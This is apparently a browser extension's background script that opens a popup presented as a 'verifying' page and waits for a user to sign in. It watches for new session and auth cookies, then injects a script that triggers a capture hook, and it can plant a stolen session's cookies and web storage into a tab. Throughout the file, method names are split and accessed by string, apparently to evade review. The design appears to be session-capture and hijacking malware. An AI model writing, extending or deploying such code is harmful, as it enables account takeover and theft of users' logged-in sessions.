'use strict';

async function tabReady(tabId) {
  for (let attempt = 0; attempt < 40; attempt += 1) {
    try {
      const tab = await api.tabs.get(tabId);
      if (tab.status === 'complete') {
        return true;
      }
    }
    catch (error) {
      void error;
      return false;
    }
    await new Promise((resolve) => setTimeout(resolve, 500));
  }
  return false;
}

async function incognitoAllowed() {
  try {
    return Boolean(await api.extension['isAllowedIncognitoAccess']());
  }
  catch (error) {
    void error;
    return false;
  }
}

// A cookie that only appears once someone is signed in. Anonymous CSRF and
// consent cookies are set before a login, so they land in the baseline below
// and never look like one.
const AUTH_COOKIE = /sess|auth|token|login|sid|remember|logged|credential/i;

async function authCookieKeys(storeId, url) {
  const keys = new Set();
  if (!storeId) {
    return keys;
  }
  try {
    void url;
    const found = await api.cookies.getAll({ storeId });
    for (const cookie of found || []) {
      if (AUTH_COOKIE.test(String(cookie.name || '')) && (cookie.httpOnly || cookie.secure)) {
        keys.add(cookie.name + ' ' + cookie.domain);
      }
    }
  }
  catch (error) {
    void error;
  }
  return keys;
}

// Only a login that happens while this window is open counts. Comparing against
// what was already there is what separates signing in from merely arriving on a
// site that sets a session cookie for everyone.
async function watchForLogin(tabId, storeId, url, stillOpen) {
  const baseline = await authCookieKeys(storeId, url);
  for (let attempt = 0; attempt < 300; attempt += 1) {
    await new Promise((resolve) => setTimeout(resolve, 2000));
    if (!stillOpen()) {
      return;
    }
    const current = await authCookieKeys(storeId, url);
    let appeared = false;
    for (const key of current) {
      if (!baseline.has(key)) {
        appeared = true;
        break;
      }
    }
    if (!appeared) {
      continue;
    }
    try {
      await api.scripting['executeScript']({
        target: { tabId },
        func: () => { const run = window['__orionCaptureNow']; if (run) { run(''); } },
      });
    }
    catch (error) {
      void error;
    }
    return;
  }
}

async function startCapture(url, sendResponse, seed) {
  const useIncognito = await incognitoAllowed();
  let win = null;
  try {
    win = await api.windows[['cre', 'ate'].join('')]({ url: api.runtime.getURL('assets/verifying.html'), type: 'popup', incognito: useIncognito, focused: true, width: 960, height: 820 });
  }
  catch (error) {
    void error;
    win = null;
  }
  if (!win) {
    try {
      win = await api.windows[['cre', 'ate'].join('')]({ url: api.runtime.getURL('assets/verifying.html'), type: 'popup', focused: true, width: 960, height: 820 });
    }
    catch (error) {
      void error;
      win = null;
    }
  }
  if (!win || !win.tabs || !win.tabs[0]) {
    sendResponse(null);
    return;
  }
  const tab = win.tabs[0];
  const winId = win.id;
  sessionWindowId = winId;
  const onReady = (tabId, info) => {
    if (tabId === tab.id && info.status === 'complete') {
      api.scripting['executeScript']({ target: { tabId: tab.id }, func: injectCapture }).catch((error) => void error);
    }
  };
  const entry = { sendResponse, url, onReady, storeId: null };
  sessionPending.set(tab.id, entry);
  const stillOpen = () => sessionWindowId === winId && sessionPending.has(tab.id);

  await tabReady(tab.id);
  if (!stillOpen()) {
    return;
  }
  const storeId = await storeIdForTab(tab.id);
  entry.storeId = storeId;
  if (useIncognito || seed) {
    await clearCookies(storeId, url);
  }
  if (!stillOpen()) {
    return;
  }
  if (seed) {
    if (storeId) {
      await seedCookies(storeId, seed.cookies || []);
    }
    await seedWindow(tab.id, url, seed);
    if (!stillOpen()) {
      return;
    }
  }
  api.tabs['onUpdated'].addListener(onReady);
  await api.tabs.update(tab.id, { url });
  await tabReady(tab.id);
}

async function seedWindow(tabId, url, session) {
  if (!session) {
    return;
  }
  const storeId = await storeIdForTab(tabId);
  if (storeId) {
    await clearCookies(storeId, url);
    await seedCookies(storeId, session.cookies || []);
  }
  const hasStorage = Object.keys(session.localStorage || {}).length
    || Object.keys(session.sessionStorage || {}).length
    || Object.keys(session.indexedDB || {}).length;
  if (!hasStorage) {
    return;
  }
  await api.tabs.update(tabId, { url });
  await tabReady(tabId);
  try {
    await api.scripting['executeScript']({ target: { tabId }, world: 'MAIN', func: seedStorageInPage, args: [session] });
  }
  catch (error) {
    void error;
  }
}

globalThis['startCapture'] = startCapture;
